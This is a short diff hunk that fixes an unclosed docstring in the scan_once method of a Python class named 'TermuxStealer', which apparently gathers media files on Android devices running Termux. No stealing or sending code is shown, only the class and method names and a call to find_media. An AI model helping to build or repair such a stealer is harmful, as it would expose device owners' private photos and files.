@@ -257,7 +257,7 @@ class TermuxStealer:
             return False
     
     def scan_once(self):
-        """Faz um scan único
+        """Faz um scan único"""
         
         media_files = self.find_media()
         
